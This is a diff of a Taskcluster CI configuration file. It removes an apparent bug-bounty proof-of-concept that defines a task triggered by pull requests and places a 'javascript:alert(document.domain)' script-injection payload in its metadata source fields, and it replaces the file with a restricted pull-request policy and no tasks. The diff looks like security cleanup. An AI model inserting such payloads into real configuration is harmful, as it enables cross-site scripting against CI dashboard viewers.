@@ -1,16 +1,4 @@
-version: 0
-metadata:
-  name: "poc2"
-  description: "authorized H1 research"
-  owner: "0xoroot@wearehackerone.com"
-  source: "javascript:alert(document.domain)"
-tasks:
-  - provisionerId: "mozilla-1"
-    workerType: "decision"
-    created: "2026-07-07T18:28:03.000Z"
-    deadline: "2026-07-07T20:33:03.000Z"
-    expires: "2026-07-08T18:33:03.000Z"
-    scopes: []
-    extra: { github: { events: ["pull_request.opened","pull_request.synchronize","pull_request.reopened"] } }
-    payload: { image: "ubuntu:22.04", maxRunTime: 300, command: ["/bin/bash","-c","echo poc2"] }
-    metadata: { name: "poc2", description: "authorized H1 research", owner: "0xoroot@wearehackerone.com", source: "javascript:alert(document.domain)" }
+version: 1
+policy:
+  pullRequests: public_restricted
+tasks: []
